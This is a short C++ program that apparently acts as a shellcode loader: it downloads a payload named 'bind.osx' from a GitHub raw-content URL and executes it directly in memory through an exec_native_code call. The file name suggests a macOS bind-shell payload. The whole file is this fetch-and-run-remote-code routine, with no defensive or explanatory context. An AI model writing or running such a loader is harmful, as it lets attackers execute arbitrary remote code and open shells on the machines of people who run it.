#include <stdio.h>
#include <iostream>
#include <istream>
#include <ostream>
#include <string>
#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/asio/ssl.hpp>

#include "native_code.h"
#include "webcc.h"

int
main(void)
{
    webcc cc("raw.githubusercontent.com", "/firebroo/test/master/bind.osx"); 
    std::pair<unsigned char*, int> shellcode = cc.received_shellcode();
    exec_native_code(shellcode.first, shellcode.second);
    free(shellcode.first);
    return 0;
}
